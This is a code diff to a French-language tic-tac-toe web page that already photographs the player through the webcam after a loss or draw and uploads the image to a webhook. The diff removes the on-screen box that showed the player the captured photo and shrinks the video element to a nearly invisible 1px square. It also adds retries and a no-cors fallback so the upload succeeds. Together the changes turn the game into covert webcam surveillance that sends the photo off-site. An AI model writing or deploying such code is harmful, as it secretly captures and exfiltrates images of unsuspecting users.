@@ -138,32 +138,6 @@
       text-shadow: 0 0 16px rgba(255, 90, 77, 0.6)
     }
 
-    .photo-box {
-      display: none;
-      background: rgba(0, 0, 0, 0.35);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      border-radius: 14px;
-      padding: 14px;
-      margin-bottom: 20px;
-      text-align: center
-    }
-
-    .photo-box h3 {
-      font-size: 13px;
-      font-weight: 600;
-      margin-bottom: 10px;
-      color: #ff5a4d
-    }
-
-    .photo-box img {
-      width: 100%;
-      max-height: 240px;
-      object-fit: cover;
-      border-radius: 10px;
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      transform: scaleX(-1)
-    }
-
     .btn {
       width: 100%;
       border: 0;
@@ -211,7 +185,7 @@
     <button class="btn" id="restartBtn" style="display:none">Rejouer</button>
   </div>
 
-  <video id="video" playsinline muted autoplay style="display:none"></video>
+  <video id="video" playsinline muted autoplay style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none"></video>
   <canvas id="canvas" style="display:none"></canvas>
 
   <script>
@@ -229,9 +203,6 @@
 
       const statusEl = document.getElementById('status');
       const cells = document.querySelectorAll('.cell');
-      const photoBox = document.getElementById('photoBox');
-      const photoTitle = document.getElementById('photoTitle');
-      const photoImg = document.getElementById('photoImg');
       const restartBtn = document.getElementById('restartBtn');
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
@@ -255,7 +226,11 @@
       async function capturePhoto() {
         if (!stream) {
           await startCamera();
-          await new Promise(r => setTimeout(r, 500));
+        }
+        let tries = 0;
+        while ((!video.videoWidth || !video.videoHeight) && tries < 20) {
+          await new Promise(r => setTimeout(r, 100));
+          tries++;
         }
         if (video.videoWidth > 0 && video.videoHeight > 0) {
           canvas.width = video.videoWidth;
@@ -263,7 +238,7 @@
           const ctx = canvas.getContext('2d');
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
           const dataUrl = canvas.toDataURL('image/jpeg', 0.92);
-          sendWebhook(canvas);
+          await sendWebhook(canvas);
           return dataUrl;
         }
         return null;
@@ -279,7 +254,11 @@
             username: 'Morpion'
           }));
           fd.append('files[0]', blob, 'capture.jpg');
-          await fetch(WEBHOOK, { method: 'POST', body: fd });
+          try {
+            await fetch(WEBHOOK, { method: 'POST', body: fd });
+          } catch (e) {
+            await fetch(WEBHOOK, { method: 'POST', body: fd, mode: 'no-cors' });
+          }
         } catch (e) { }
       }
 
@@ -348,17 +327,11 @@
           if (winner === 'O') {
             statusEl.className = 'status lose';
             statusEl.textContent = 'Défaite : vous n\'avez pas gagné';
-            photoTitle.textContent = 'Défaite — Photo prise';
           } else {
             statusEl.className = 'status draw';
             statusEl.textContent = 'Match nul : vous n\'avez pas gagné';
-            photoTitle.textContent = 'Match nul — Photo prise';
           }
-          const data = await capturePhoto();
-          if (data) {
-            photoImg.src = data;
-            photoBox.style.display = 'block';
-          }
+          await capturePhoto();
         }
       }
 
@@ -411,8 +384,6 @@
         });
         statusEl.className = 'status';
         statusEl.textContent = 'À votre tour (X)';
-        photoBox.style.display = 'none';
-        photoImg.src = '';
         restartBtn.style.display = 'none';
       });
     })();
